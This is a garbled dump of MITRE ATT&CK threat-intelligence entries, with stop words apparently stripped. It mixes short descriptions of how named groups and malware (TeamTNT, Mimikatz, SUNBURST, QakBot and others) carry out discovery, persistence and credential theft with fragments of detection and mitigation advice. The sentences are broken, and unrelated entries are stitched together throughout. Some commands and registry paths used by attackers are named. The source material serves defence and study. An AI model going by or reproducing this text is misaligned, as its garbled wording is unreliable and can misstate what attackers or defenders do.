Mandiant UNC3890 Aug 2022) [TeamTNT](https://attack.mitre.org/groups/G0139) executed [Hildegard](https://attack.mitre.org/software/S0601) kubelet API command executing commands running containers.(Citation: Unit 42 Hildegard Malware) [menuPass](https://attack.mitre.org/groups/G0045) <code>net use</code> conduct connectivity checks machines.(Citation: PWC Cloud Hopper April 2017) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors Makecab utility compress version WinRAR create password-protected archives stolen data prior exfiltration.(Citation: Cybereason OperationCuckooBees 2022) [Earth Lusca](https://attack.mitre.org/groups/G1006) dropped SSH-authorized key `/root/.ssh` folder access compromised server SSH.(Citation: TrendMicro EarthLusca 2022) [Proton](https://attack.mitre.org/software/S0279) persists Launch Agent.(Citation: objsee mac malware 2017) [Stuxnet](https://attack.mitre.org/software/S0603) transforms encrypted binary data ASCII string URL parameter value.(Citation: Symantec W.32 Stuxnet Dossier) [ccf32](https://attack.mitre.org/software/S1043) automatically collect files compromised host.(Citation: Bitdefender FunnyDream Campaign November 2020) [Transparent Tribe](https://attack.mitre.org/groups/G0134) weaponized documents e-mail compromise targeted systems.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)(Citation: Talos Oblique RAT March 2021)(Citation: Talos Transparent Tribe 2021)(Citation: Unit 42 ProjectM March 2016) [HermeticWizard](https://attack.mitre.org/software/S0698) `cmd.exe` execution compromised hosts.(Citation: ESET Hermetic Wizard March 2022) [LoudMiner](https://attack.mitre.org/software/S0451) launched QEMU services <code>/Library/LaunchDaemons/</code> folder <code>launchctl</code>. <code>launchctl</code> unload [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s updating version [LoudMiner](https://attack.mitre.org/software/S0451).(Citation: ESET LoudMiner June 2019)	 [Remsec](https://attack.mitre.org/software/S0125) plugin drop execute vulnerable Outpost Sandbox avast! Virtualization drivers gain kernel mode privileges.(Citation: Kaspersky ProjectSauron Technical Analysis) [WinMM](https://attack.mitre.org/software/S0059) sets WH_CBT Windows hook collect process creation.(Citation: Baumgartner Naikon 2015) [NanoCore](https://attack.mitre.org/software/S0336) remote command-line interface execute commands.(Citation: PaloAlto NanoCore Feb 2016) [NanoCore](https://attack.mitre.org/software/S0336) JavaScript files.(Citation: Cofense NanoCore Mar 2018) [Cuba](https://attack.mitre.org/software/S0625) built-in API functions discovery GetIpNetTable NetShareEnum.(Citation: McAfee Cuba April 2021)  technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [Bundlore](https://attack.mitre.org/software/S0482) enumerate macOS version determine follow-on behaviors execute <code>/usr/bin/sw_vers -productVersion</code>.(Citation: MacKeeper Bundlore Apr 2019)(Citation: 20 macOS Common Tools Techniques) [Darkhotel](https://attack.mitre.org/groups/G0012) obfuscated code RC4, XOR, RSA.(Citation: Securelist Darkhotel Aug 2015)(Citation: DUBNIUM July 2016) [FIN7](https://attack.mitre.org/groups/G0046) SQL scripts perform tasks victim's machine.(Citation: FireEye FIN7 Aug 2018)(Citation: Flashpoint FIN 7 March 2019)(Citation: FireEye FIN7 Aug 2018) [APT3](https://attack.mitre.org/groups/G0022) brute force password hashes leverage plain credentials.(Citation: APT3 Adversary Emulation Plan) Prevent administrator accounts enumerated application elevating UAC lead disclosure account names. Registry key located <code>HKLM\ SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\CredUI\EnumerateAdministrators</code>. disabled GPO: Configuration > [Policies] > Administrative Templates > Windows Components > Credential User Interface: Enumerate administrator accounts elevation.(Citation: UCF STIG Elevation Account Enumeration) [QakBot](https://attack.mitre.org/software/S0650) identify installed antivirus product targeted system.(Citation: Crowdstrike Qakbot October 2020)(Citation: ATT QakBot April 2021)(Citation: ATT QakBot April 2021)(Citation: Kaspersky QakBot September 2021) [Magic Hound](https://attack.mitre.org/groups/G0059) compromised domains host links targeted specific phishing victims.(Citation: ClearSky Kittens 3 August 2020)(Citation: Proofpoint TA453 July2021)(Citation: Certfa Charming Kitten January 2021) [WhisperGate](https://attack.mitre.org/software/S0689) corrupt files overwriting 1 MB `0xcc` appending random extensions.(Citation: WhisperGate January 2022)(Citation: Crowdstrike WhisperGate January 2022)(Citation: Cybereason WhisperGate February 2022)(Citation: Unit 42 WhisperGate January 2022)(Citation: Cisco Ukraine Wipers January 2022)(Citation: Medium S2W WhisperGate January 2022) [Dok](https://attack.mitre.org/software/S0281) proxies traffic monitor alter victim HTTP(S) traffic.(Citation: objsee mac malware 2017)(Citation: CheckPoint Dok) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors conducted file listing discovery multiple hosts ensure locker encryption successful.(Citation: DFIR Conti Bazar Nov 2021) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Fox Kitten](https://attack.mitre.org/groups/G0117) Angry IP Scanner detect remote systems.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [LiteDuke](https://attack.mitre.org/software/S0513) enumerate CPUID BIOS version compromised system.(Citation: ESET Dukes October 2019) [Remsec](https://attack.mitre.org/software/S0125) module data airgapped networks Internet-connected systems removable USB device.(Citation: Kaspersky ProjectSauron Report) [ShimRatReporter](https://attack.mitre.org/software/S0445) ability download additional payloads.(Citation: FOX-IT 2016 Mofang) [SysUpdate](https://attack.mitre.org/software/S0663) deobfuscate packed binaries memory.(Citation: Trend Micro Iron Tiger April 2021) [Elise](https://attack.mitre.org/software/S0081) download additional files C2 server execution.(Citation: Accenture Dragonfish Jan 2018) [Briba](https://attack.mitre.org/software/S0204) rundll32 [Registry / Startup Folder](https://attack.mitre.org/techniques/T1547/001) entries execute malicious DLLs.(Citation: Symantec Briba 2012) [Rising Sun](https://attack.mitre.org/software/S0448) collected data files compromised host.(Citation: McAfee Sharpshooter December 2018) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) Python-based remote access tools.(Citation: Trend Micro Tick November 2019) [Carbanak](https://attack.mitre.org/software/S0030) obtains Windows logon password details.(Citation: FireEye CARBANAK June 2017) (Citation: Mandiant APT1) [SideCopy](https://attack.mitre.org/groups/G1008) identified country location compromised host.(Citation: MalwareBytes SideCopy Dec 2021) [ZxxZ](https://attack.mitre.org/software/S1013) created snapshot running processes `CreateToolhelp32Snapshot`.(Citation: Cisco Talos Bitter Bangladesh 2022) [Operation Spalax](https://attack.mitre.org/campaigns/C0005), threat actors packers CyaX.(Citation: ESET Operation Spalax Jan 2021) tools [Suckfly](https://attack.mitre.org/groups/G0039) command-line driven.(Citation: Symantec Suckfly 2016) [Grandoreiro](https://attack.mitre.org/software/S0531) identify installed security tools based process names.(Citation: ESET Grandoreiro April 2020) [Turla](https://attack.mitre.org/groups/G0010) VBS scripts operations.(Citation: Symantec Waterbug Jun 2019)	 [InvisiMole](https://attack.mitre.org/software/S0260) check artifacts VirtualBox, Virtual PC VMware environment, terminate detected.(Citation: ESET InvisiMole June 2020) Monitor anomalous Kerberos activity, malformed blank fields Windows logon/logoff events (Event 4769, 4768), RC4 encryption TGTs, TGS requests preceding TGT requests. Monitor lifetime TGT tickets values default domain duration. Monitor indications Pass Ticket laterally. [BITTER](https://attack.mitre.org/groups/G1002) tools PuTTY operations.(Citation: Forcepoint BITTER Pakistan Oct 2016) [Fysbis](https://attack.mitre.org/software/S0410) ability search files.(Citation: Fysbis Dr Analysis)  [Lokibot](https://attack.mitre.org/software/S0447) decoded decrypted stages multiple times hard-coded deliver final payload, decoded server response hex string XOR.(Citation: Talos Lokibot Jan 2021) (Citation: Symantec Elderwood Sept 2012) [Valak](https://attack.mitre.org/software/S0476) .NET compiled module named exchgrabber enumerate credentials Credential Manager.(Citation: SentinelOne Valak June 2020) [SeaDuke](https://attack.mitre.org/software/S0053) C2 traffic base64-encoded.(Citation: Unit 42 SeaDuke 2015) Common tools detecting Linux rootkits include: rkhunter (Citation: SourceForge rkhunter), chrootkit (Citation: Chkrootkit Main), rootkits designed evade detection tools. (Citation: CISA SoreFang July 2016) [Skidmap](https://attack.mitre.org/software/S0468) ability add public key handlers <code>authorized_keys</code> file maintain persistence infected host.(Citation: Trend Micro Skidmap) [Threat Group-3390](https://attack.mitre.org/groups/G0027) actors Hunter tool conduct network service discovery vulnerable systems.(Citation: Dell TG-3390)(Citation: Unit42 Emissary Panda 2019) [Green Lambert](https://attack.mitre.org/software/S0690) add plist file `Library/LaunchDaemons` establish persistence.(Citation: Objective Green Lambert OSX Oct 2021)(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021)  Monitor executed commands arguments logon scripts [Milan](https://attack.mitre.org/software/S1015) saved files prior upload compromised host folders characters `a9850d2f`.(Citation: ClearSky Siamesekitten August 2021) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors accessed collected credentials password managers.(Citation: FoxIT Wocao December 2019) [Cadelspy](https://attack.mitre.org/software/S0454) ability identify windows compromised host.(Citation: Symantec Chafer Dec 2015) [Kinsing](https://attack.mitre.org/software/S0599) valid SSH credentials access remote hosts.(Citation: Aqua Kinsing April 2020) [Bandook](https://attack.mitre.org/software/S0234) upload files victim's machine C2 channel.(Citation: CheckPoint Bandook Nov 2020) Monitor contextual data malicious payload, compilation times, file hashes, watermarks identifiable configuration information. activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, Defense Evasion Command Control. [PoshC2](https://attack.mitre.org/software/S0378) Inveigh conduct service poisoning credential theft relay attacks.(Citation: GitHub PoshC2) [Machete](https://attack.mitre.org/software/S0409) AES exfiltrate documents.(Citation: ESET Machete July 2019) (Citation: Kaspersky Lyceum October 2021) [Okrum](https://attack.mitre.org/software/S0439) built-in commands uploading, downloading, executing files system.(Citation: ESET Okrum July 2019) [BendyBear](https://attack.mitre.org/software/S0574) check analysis environments signs debugging Windows API <code>kernel32!GetTickCountKernel32</code> call.(Citation: Unit42 BendyBear Feb 2021)  [Elise](https://attack.mitre.org/software/S0081) executes <code>systeminfo</code> initial communication remote server.(Citation: Lotus Blossom Jun 2015) [VERMIN](https://attack.mitre.org/software/S0257) initially packed.(Citation: Unit 42 VERMIN Jan 2018) administrator accounts permissions add component software services day-to-day operations expose potential adversaries unprivileged systems.  [QuietSieve](https://attack.mitre.org/software/S0686) HTTPS C2 communications.(Citation: Actinium February 2022) [WannaCry](https://attack.mitre.org/software/S0366) attempts kill processes Exchange, SQL Server, MySQL encrypt data stores.(Citation: FireEye WannaCry 2017)(Citation: SecureWorks WannaCry Analysis) [SUNBURST](https://attack.mitre.org/software/S0559) collected hostname, OS version, device uptime.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Analyzing Solorigate Dec 2020) [SynAck](https://attack.mitre.org/software/S0242) payloads obfuscated prior compilation inhibit analysis reverse engineering.(Citation: SecureList SynAck Doppelgänging 2018)(Citation: Kaspersky Lab SynAck 2018) [Imminent Monitor](https://attack.mitre.org/software/S0434) PasswordRecoveryPacket module recovering browser passwords.(Citation: QiAnXin APT-C-36 Feb2019) Monitor third-party application logging, messaging, artifacts backdoor servers shells establish persistent access systems. Log authentication attempts server unusual traffic patterns server internal network. (Citation: US-CERT Alert TA15-314A Shells) [Volgmer](https://attack.mitre.org/software/S0180) installs randomly selected service, overwrites ServiceDLL entry service's Registry entry. [Volgmer](https://attack.mitre.org/software/S0180) variants install .dll files services names generated list hard-coded strings.(Citation: US-CERT Volgmer Nov 2017)(Citation: US-CERT Volgmer 2 Nov 2017)(Citation: Symantec Volgmer Aug 2014) [Dyre](https://attack.mitre.org/software/S0024) ability identify users compromised host.(Citation: Malwarebytes Dyreza November 2015) Monitor files unexpected modifications access permissions attributes   Lack expected log events suspicious. Monitor telemetry context modification deletion security software processes services Windows Defender definition files Windows log files Linux. [Duqu](https://attack.mitre.org/software/S0038) configured commands relayed peer-to-peer network infected hosts hosts Internet access.(Citation: Symantec W32.Duqu) Monitor firmware unexpected modifications settings data hidden file conceal malicious activity users security tools. [Bootkit](https://attack.mitre.org/techniques/T1542/003) [Azorult](https://attack.mitre.org/software/S0344) encrypt C2 traffic XOR.(Citation: Unit42 Azorult Nov 2018)(Citation: Proofpoint Azorult July 2018) [Ramsay](https://attack.mitre.org/software/S0458) screenshots 30 external removable storage device connected.(Citation: Antiy CERT Ramsay April 2020) [PUNCHTRACK](https://attack.mitre.org/software/S0197) scrapes memory properly formatted payment card data.(Citation: FireEye Fin8 2016)(Citation: FireEye Enemy FIN8 Aug 2016) [Net](https://attack.mitre.org/software/S0039) commands <code>/domain</code> flag gather manipulate user accounts current domain.(Citation: Net) Anti-virus automatically quarantine suspicious files.  [KEYMARBLE](https://attack.mitre.org/software/S0271) list running processes system.(Citation: US-CERT KEYMARBLE Aug 2018) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific protocol adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) (Citation: FireEye APT10 Sept 2018) [POWERSTATS](https://attack.mitre.org/software/S0223) deobfuscate main backdoor code.(Citation: ClearSky MuddyWater Nov 2018) Ensure proper access isolation critical network systems policy. [BlackEnergy](https://attack.mitre.org/software/S0089) capable screenshots.(Citation: Securelist BlackEnergy Nov 2014) [Remsec](https://attack.mitre.org/software/S0125) capable listing contents folders victim. [Remsec](https://attack.mitre.org/software/S0125) searches custom network encryption software victims.(Citation: Symantec Remsec IOCs)(Citation: Kaspersky ProjectSauron Report)(Citation: Kaspersky ProjectSauron Technical Analysis) Monitor unexpected deletion active directory object, Windows EID 5141. [Higaisa](https://attack.mitre.org/groups/G0126) called native OS APIs.(Citation: Zscaler Higaisa 2020) [GoldenSpy](https://attack.mitre.org/software/S0493) gathered operating information.(Citation: Trustwave GoldenSpy June 2020)	 (Citation: FireEye APT33 Guardrail) [GuLoader](https://attack.mitre.org/software/S0561) spread phishing campaigns malicious links.(Citation: Unit 42 NETWIRE April 2020) [Egregor](https://attack.mitre.org/software/S0554) perform  sleep (greater equal 3 minutes) evade detection.(Citation: JoeSecurity Egregor 2020) [Bazar](https://attack.mitre.org/software/S0534) TLS C2 communications.(Citation: Zscaler Bazar September 2020) [WINERACK](https://attack.mitre.org/software/S0219) enumerate processes.(Citation: FireEye APT37 Feb 2018) [Flagpro](https://attack.mitre.org/software/S0696) check window displayed system.(Citation: NTT Security Flagpro December 2021)  [jRAT](https://attack.mitre.org/software/S0283) distributed HTA files VBScript.(Citation: Kaspersky Adwind Feb 2016)	 [MarkiRAT](https://attack.mitre.org/software/S0652) <code>GetKeyboardLayout</code> API check compromised host's keyboard set Persian.(Citation: Kaspersky Ferocious Kitten Jun 2021) [njRAT](https://attack.mitre.org/software/S0385) gathers windows initial infection.(Citation: Fidelis njRAT June 2013) Detection Endpoint DoS achieved sufficient impact availability service, response time typically requires aggressive monitoring responsiveness. Monitor logging, messaging, artifacts highlighting health host sensors (ex: metrics, errors, exceptions logging applications) [QakBot](https://attack.mitre.org/software/S0650) <code>GetProcAddress</code> delete malicious strings memory.(Citation: ATT QakBot April 2021) [Micropsia](https://attack.mitre.org/software/S0339) searches anti-virus software firewall products installed victim’s machine WMI.(Citation: Talos Micropsia June 2017)(Citation: Radware Micropsia July 2018) [KOCTOPUS](https://attack.mitre.org/software/S0669) deployed modified version Invoke-Ngrok expose local ports Internet.(Citation: MalwareBytes LazyScripter Feb 2021) [Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013), threat actors malicious Word OLE documents victims.(Citation: McAfee Sharpshooter December 2018) [Machete](https://attack.mitre.org/software/S0409) scanned looked cryptographic certificate file extensions.(Citation: ESET Machete July 2019)  [POWRUNER](https://attack.mitre.org/software/S0184) C2 communications.(Citation: FireEye APT34 Dec 2017)(Citation: FireEye APT34 Webinar Dec 2017) [TeamTNT](https://attack.mitre.org/groups/G0139) scripts execution.(Citation: Trend Micro TeamTNT)(Citation: Cisco Talos Intelligence Group) Monitor files establish persistence elevate privileges executing malicious content triggered application shims. [Earth Lusca](https://attack.mitre.org/groups/G1006) <code>DCSync</code> command [Mimikatz](https://attack.mitre.org/software/S0002) retrieve credentials exploited controller.(Citation: TrendMicro EarthLusca 2022) [China Chopper](https://attack.mitre.org/software/S0020)'s server component upload local files.(Citation: FireEye Periscope March 2018)(Citation: Lee 2013)(Citation: NCSC Joint Report Public Tools) [IronNetInjector](https://attack.mitre.org/software/S0581) IronPython scripts load .NET injector inject payload remote process.(Citation: Unit 42 IronNetInjector February 2021 ) [Dragonfly](https://attack.mitre.org/groups/G0035) forms spearphishing attempts users malicious attachments.(Citation: Gigamon Berserk Bear October 2021) [Empire](https://attack.mitre.org/software/S0363) includes keylogging capabilities Windows, Linux, macOS systems.(Citation: Github PowerShell Empire) [down_new](https://attack.mitre.org/software/S0472) ability identify volume compromised host.(Citation: Trend Micro Tick November 2019) [BloodHound](https://attack.mitre.org/software/S0521) ability collect local admin GPO.(Citation: GitHub Bloodhound) [Diavol](https://attack.mitre.org/software/S0659) collect username compromised host.(Citation: Fortinet Diavol July 2021) [SombRAT](https://attack.mitre.org/software/S0615) execute <code>getinfo</code>  discover current time compromised host.(Citation: BlackBerry CostaRicto November 2020)(Citation: CISA AR21-126A FIVEHANDS 2021) [RTM](https://attack.mitre.org/software/S0148) capability download VNC module command control (C2).(Citation: ESET RTM Feb 2017) Monitor executed commands arguments attempt exfiltrate data Bluetooth command control channel. [Wizard Spider](https://attack.mitre.org/groups/G0102) exploited attempted exploit Zerologon (CVE-2020-1472) EternalBlue (MS17-010) vulnerabilities.(Citation: FireEye KEGTAP SINGLEMALT October 2020)(Citation: DFIR Ryuk's Return October 2020)(Citation: DFIR Ryuk 5 Hours October 2020) Ensure built-in created local administrator accounts complex, unique passwords. [NanoCore](https://attack.mitre.org/software/S0336) gathers IP address victim’s machine.(Citation: DigiTrust NanoCore Jan 2017) [MacMa](https://attack.mitre.org/software/S1016) collect compromised computer, including: Hardware UUID, Mac serial number, macOS version, disk sizes.(Citation: ESET DazzleSpy Jan 2022) [Indrik Spider](https://attack.mitre.org/groups/G0119) <code>wmic.exe</code> add user system.(Citation: Symantec WastedLocker June 2020) [HEXANE](https://attack.mitre.org/groups/G1001) identified specific potential victims targeted organizations.(Citation: ClearSky Siamesekitten August 2021) [Conficker](https://attack.mitre.org/software/S0608) adds Registry <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services</code> Registry locations.(Citation: SANS Conficker)(Citation: Trend Micro Conficker) [ComRAT](https://attack.mitre.org/software/S0126) portable FAT16 partition image %TEMP% hidden file system.(Citation: ESET ComRAT 2020) [DCSrv](https://attack.mitre.org/software/S1033) created Registry persistence.(Citation: Checkpoint MosesStaff Nov 2021) [MacMa](https://attack.mitre.org/software/S1016) custom JSON-based protocol C&C communications.(Citation: ESET DazzleSpy Jan 2022) [Pupy](https://attack.mitre.org/software/S0192) upload download to/from victim machine.(Citation: GitHub Pupy) [Ke3chang](https://attack.mitre.org/groups/G0004) tools download files compromised machines.(Citation: NICKEL December 2021) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors deployed [ASPXSpy](https://attack.mitre.org/software/S0073) compromised servers.(Citation: McAfee Night Dragon) [Bisonal](https://attack.mitre.org/software/S0268) delete dropper VBS scripts victim’s machine.(Citation: Unit 42 Bisonal July 2018)(Citation: Kaspersky CactusPete Aug 2020)(Citation: Talos Bisonal Mar 2020) [KillDisk](https://attack.mitre.org/software/S0607) <code>FindNextFile</code> command file deletion process.(Citation: Trend Micro KillDisk 2) [H1N1](https://attack.mitre.org/software/S0132) functionality network shares.(Citation: Cisco H1N1 2) [Hydraq](https://attack.mitre.org/software/S0203) creates backdoor remote attackers load DLL functions.(Citation: Symantec Trojan.Hydraq Jan 2010)(Citation: Symantec Hydraq Jan 2010) [Epic](https://attack.mitre.org/software/S0091) collects user victim’s machine.(Citation: Kaspersky Turla Aug 2014) [InvisiMole](https://attack.mitre.org/software/S0260) command disable routing Firewall victim’s machine.(Citation: ESET InvisiMole June 2018) [FunnyDream](https://attack.mitre.org/software/S1044) FilepakMonitor component detect removable drive insertion.(Citation: Bitdefender FunnyDream Campaign November 2020) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) tool query Registry proxy settings.(Citation: Zscaler APT31 Covid-19 October 2020) Monitor unexpected abnormal accesses network shares. [Cobalt Strike](https://attack.mitre.org/software/S0154) [PsExec](https://attack.mitre.org/software/S0029) execute payload remote host. Service Control Manager start services.(Citation: cobaltstrike manual)(Citation: Cobalt Strike TTPs Dec 2017)(Citation: Cobalt Strike Manual 4.3 November 2020) [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) breached Managed Service Providers (MSP's) deliver malware MSP customers.(Citation: Secureworks REvil September 2019) [Koadic](https://attack.mitre.org/software/S0250) mshta serve additional payloads schedule tasks persistence.(Citation: Github Koadic)(Citation: MalwareBytes LazyScripter Feb 2021)  [POWERSTATS](https://attack.mitre.org/software/S0223) ability identify username compromised host.(Citation: TrendMicro POWERSTATS V3 June 2019) (Citation: IB Silence Aug 2019) [RDAT](https://attack.mitre.org/software/S0495) embed data BMP image prior exfiltration.(Citation: Unit42 RDAT July 2020)	 technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [Ryuk](https://attack.mitre.org/software/S0446) stopped services anti-virus.(Citation: FireEye Ryuk Trickbot January 2019) [Nebulae](https://attack.mitre.org/software/S0630) download files C2.(Citation: Bitdefender Naikon April 2021) Monitor unexpected processes interacting authentication mechanisms processes access user credentials enable unwarranted access accounts. [Patchwork](https://attack.mitre.org/groups/G0040) signed malware self-signed certificates fictitious spoofed legitimate software companies.(Citation: Unit 42 BackConfig 2020) Perform physical inspection hardware potential tampering. Perform integrity checking pre-OS boot mechanisms manipulated malicious purposes compare baseline behavior. (Citation: F-Secure Dukes)(Citation: ESET Dukes October 2019)(Citation: Secureworks IRON HEMLOCK Profile) Limit credential overlap systems prevent damage credential compromise reduce adversary's ability perform Lateral Movement systems. [USBferry](https://attack.mitre.org/software/S0452) <code>net view</code> gather remote systems.(Citation: TrendMicro Tropic Trooper 2020) [GALLIUM](https://attack.mitre.org/groups/G0093) Windows command execute commands.(Citation: Cybereason Soft Cell June 2019) (Citation: FireEye APT10 April 2017) [Donut](https://attack.mitre.org/software/S0695) generate shellcode outputs execute Python.(Citation: Donut Github)	 settings prevent applications running downloaded Apple Store (or legitimate repositories) mitigate issues. enable application control solutions AppLocker Device Guard block loading malicious content. [Exaramel Linux](https://attack.mitre.org/software/S0401) command download file  remote C2 server.(Citation: ESET TeleBots Oct 2018)(Citation: ANSSI Sandworm January 2021) [APT28](https://attack.mitre.org/groups/G0007) spearphishing emails malicious Office RAR attachments.(Citation: Unit 42 Sofacy Feb 2018)(Citation: Sofacy DealersChoice)(Citation: Palo Alto Sofacy 06-2018)(Citation: DOJ GRU Indictment Jul 2018)(Citation: Securelist Sofacy Feb 2018)(Citation: Accenture SNAKEMACKEREL Nov 2018)(Citation: TrendMicro Pawn Storm Dec 2020)(Citation: Secureworks IRON TWILIGHT Active Measures March 2017) [TajMahal](https://attack.mitre.org/software/S0467) ability capture webcam video.(Citation: Kaspersky TajMahal April 2019) Grant access application deployment systems limited authorized administrators.  Verify account credentials access deployment systems unique enterprise network. [SideCopy](https://attack.mitre.org/groups/G1008) loader DLL file collect AV product names infected host.(Citation: MalwareBytes SideCopy Dec 2021) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [Ke3chang](https://attack.mitre.org/groups/G0004) performs account discovery commands <code>net localgroup administrators</code> <code>net "REDACTED" /domain</code> specific permissions groups.(Citation: Mandiant Operation Ke3chang November 2014) [SUNBURST](https://attack.mitre.org/software/S0559) commands attacker write delete registry keys, observed stopping services setting <code>HKLM\SYSTEM\CurrentControlSet\services\\[service_name]\\Start</code> registry entries 4.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Analyzing Solorigate Dec 2020) deleted previously-created Image File Execution Options (IFEO) Debugger registry values registry proxy clean traces activity.(Citation: Deep Dive Solorigate January 2021) [Micropsia](https://attack.mitre.org/software/S0339) keylogging capabilities.(Citation: Radware Micropsia July 2018) (Citation: FireEye APT41 Aug 2019) (Citation: NCC TA505) [Flagpro](https://attack.mitre.org/software/S0696) ability wait time interval communicating executing commands C2.(Citation: NTT Security Flagpro December 2021) [StrifeWater](https://attack.mitre.org/software/S1034) create scheduled task named `Mozilla\Firefox Default Browser Agent 409046Z0FF4A39CB` persistence.(Citation: Cybereason StrifeWater Feb 2022) [FIN7](https://attack.mitre.org/groups/G0046) SSH laterally victim environments.(Citation: CrowdStrike Carbon Spider August 2021) [Pysa](https://attack.mitre.org/software/S0583) perform network reconnaissance Advanced IP Scanner tool.(Citation: CERT-FR PYSA April 2020) [FIVEHANDS](https://attack.mitre.org/software/S0618) WMI delete files  target machine.(Citation: FireEye FiveHands April 2021)(Citation: CISA AR21-126A FIVEHANDS 2021) [SpeakUp](https://attack.mitre.org/software/S0374) cron tasks ensure persistence. (Citation: CheckPoint SpeakUp Feb 2019) [Chimera](https://attack.mitre.org/groups/G0114) staged stolen data designated servers target environment.(Citation: NCC Chimera January 2021) Monitor unexpected processes interacting LSASS.exe.(Citation: Medium Detecting Attempts Steal Passwords Memory) Common credential dumpers Mimikatz access LSASS.exe process, locating LSA secrets key, decrypting sections memory credential details stored. Credential dumpers methods reflective [Process Injection](https://attack.mitre.org/techniques/T1055) reduce potential indicators malicious activity. Commands <code>net user</code> [Net](https://attack.mitre.org/software/S0039) gather manipulate user accounts.(Citation: Savill 1999) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors malicious DLL search files specific keywords.(Citation: McAfee Honeybee) [Mimikatz](https://attack.mitre.org/software/S0002)’s <code>LSADUMP::DCShadow</code> module updates temporarily setting DC.(Citation: Deply Mimikatz)(Citation: Adsecurity Mimikatz Guide) Monitor executed commands arguments invocation utilities determining origin purpose binary executed. [NETEAGLE](https://attack.mitre.org/software/S0034) send process listings C2 channel.(Citation: FireEye APT30) [HAWKBALL](https://attack.mitre.org/software/S0391) OLE object Equation Editor drop embedded shellcode.(Citation: FireEye HAWKBALL Jun 2019) [Stuxnet](https://attack.mitre.org/software/S0603) encrypts exfiltrated data C2 static 31-byte XOR keys.(Citation: Symantec W.32 Stuxnet Dossier) [APT38](https://attack.mitre.org/groups/G0082) utility called CLOSESHAVE securely delete file system. removed malware, tools, non-native files intrusion reduce footprint post-intrusion cleanup process.(Citation: FireEye APT38 Oct 2018)(Citation: CISA AA20-239A BeagleBoyz August 2020) [DanBot](https://attack.mitre.org/software/S1014) files named `UltraVNC.exe` `WINVNC.exe` legitimate VNC tools.(Citation: ClearSky Siamesekitten August 2021) [Axiom](https://attack.mitre.org/groups/G0001) collected data compromised network.(Citation: Novetta-Axiom) [AppleSeed](https://attack.mitre.org/software/S0622) ability execute payload PowerShell.(Citation: Malwarebytes Kimsuky June 2021) [MoonWind](https://attack.mitre.org/software/S0149) installs service automatic startup establish persistence. service checks 60 determine malware running; not, spawn instance.(Citation: Palo Alto MoonWind March 2017) [Exaramel Windows](https://attack.mitre.org/software/S0343) automatically encrypts files sending C2 server.(Citation: ESET TeleBots Oct 2018)  [Volatile Cedar](https://attack.mitre.org/groups/G0123) performed vulnerability scans target server.(Citation: CheckPoint Volatile Cedar March 2015)(Citation: ClearSky Lebanese Cedar Jan 2021) [Siloscape](https://attack.mitre.org/software/S0623) searches kubectl binary.(Citation: Unit 42 Siloscape Jun 2021) [PUNCHBUGGY](https://attack.mitre.org/software/S0196) load DLL LoadLibrary API.(Citation: FireEye Enemy FIN8 Aug 2016) [QuietSieve](https://attack.mitre.org/software/S0686) download execute payloads target host.(Citation: Actinium February 2022) [Evilnum](https://attack.mitre.org/groups/G0120) component called TerraLoader check hardware file detect sandboxed environments. (Citation: ESET EvilNum July 2020) [JCry](https://attack.mitre.org/software/S0389) encrypted files demanded Bitcoin decrypt files. (Citation: Carbon Black JCry 2019) [Kimsuky](https://attack.mitre.org/groups/G0094) tools Nirsoft WebBrowserPassVIew, [Mimikatz](https://attack.mitre.org/software/S0002), [PsExec](https://attack.mitre.org/software/S0029).(Citation: Netscout Stolen Pencil Dec 2018)(Citation: Talos Kimsuky Nov 2021) analyzing malware features adversary developers, compiler used, debugging artifacts, code similarities. Malware repositories identify additional samples adversary identify development patterns time. activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, Defense Evasion Command Control. (Citation: Unit 42 QUADAGENT July 2018) [Mustang Panda](https://attack.mitre.org/groups/G0129) hosted malicious payloads DropBox including [PlugX](https://attack.mitre.org/software/S0013).(Citation: Proofpoint TA416 Europe March 2022) [Clop](https://attack.mitre.org/software/S0611) built-in API functions WNetOpenEnumW(), WNetEnumResourceW(), WNetCloseEnum(), GetProcAddress(), VirtualAlloc().(Citation: Mcafee Clop Aug 2019)(Citation: Cybereason Clop Dec 2020) [OilRig](https://attack.mitre.org/groups/G0049) C2.(Citation: Unit 42 Playbook Dec 2017)(Citation: FireEye APT34 Webinar Dec 2017)(Citation: FireEye APT34 July 2019) [Pteranodon](https://attack.mitre.org/software/S0147) `cmd.exe` execution victim systems.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: Symantec Shuckworm January 2022) info module [CozyCar](https://attack.mitre.org/software/S0046) gathers victim host’s configuration.(Citation: F-Secure CozyDuke) Security applications behavior exploitation Windows Defender Exploit Guard (WDEG) Enhanced Mitigation Experience Toolkit (EMET) mitigate exploitation behavior.(Citation: TechNet Moving EMET) Control flow integrity checking identify software exploit occurring.(Citation: Wikipedia Control Flow Integrity) protections depend architecture target application binary compatibility software targeted defense evasion. Disable WinRM service. 